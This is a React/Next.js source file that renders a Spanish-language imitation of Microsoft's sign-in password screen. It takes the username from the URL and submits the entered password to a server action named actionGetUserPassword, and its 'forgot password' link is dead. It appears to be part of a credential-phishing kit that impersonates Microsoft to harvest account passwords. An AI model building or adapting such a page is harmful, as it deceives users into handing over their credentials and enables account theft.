"use client";

import { useFormState, useFormStatus } from "react-dom";
import { useRouter, useSearchParams } from "next/navigation";
import Image from "next/image";
import Link from "next/link";

import styles from "./styles/Home.module.css";
import { useEffect, useState } from "react";
import { actionGetUserPassword } from "../lib/actions";

import ArrowIcon from "./static/images/arrow-icon.svg";

export default function PassForm() {
  const searchParams = useSearchParams();
  const username = searchParams.get("username") || "";
  const router = useRouter();

  const initialState = {
    message: "NONE",
    params: searchParams.toString(),
  };

  const [state, formAction] = useFormState(actionGetUserPassword, initialState);
  const [error, setError] = useState(false);
  const { pending } = useFormStatus();

  useEffect(() => {
    if (state?.message == "ERROR") {
      setError(true);
    }
  }, [state]);

  return (
    <div>
      <div className="mt-4 h-6 text-[15x]">
        <div
          title={username.toLocaleLowerCase()}
          className={styles["form-identity"]}
        >
          <button
            className={styles["form-btnBack"]}
            onClick={() => router.back()}
          >
            <Image width={24} height={24} src={ArrowIcon} alt="Icon Arrow" />
          </button>
          {username.toLocaleLowerCase()}
        </div>
      </div>
      <div className="flex flex-col gap-2">
        <form action={formAction}>
          <h1 className={`${styles["form-title"]} mb-2`}>
            Escribir contraseña
          </h1>
          {error ? (
            <div className={styles["form-error-text"]}>
              Escribe la contraseña de tu cuenta Microsoft.
            </div>
          ) : null}
          <div>
            <input
              aria-required="true"
              data-username
              autoComplete="username"
              type="hidden"
              name="username"
              placeholder="username"
              defaultValue={username}
            />
            <input
              aria-required="true"
              autoComplete="current-password"
              className={`${styles["form-inputPrimary"]} ${
                error && styles["form-error"]
              }`}
              type="password"
              name="password"
              onInput={(event) => {
                const input = event.target as HTMLInputElement;
                input.value ? setError(false) : setError(true);
              }}
              placeholder="Contraseña"
            />
          </div>
          <div className="text-[13px]">
            <Link className={styles["form-linkPrimary"]} href="#">
              He olvidado mi contraseña
            </Link>
          </div>
          <div className={styles["form-btnContainer"]}>
            <button
              aria-disabled={pending}
              type="submit"
              className={styles["form-btnPrimary"]}
            >
              Iniciar sesión
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
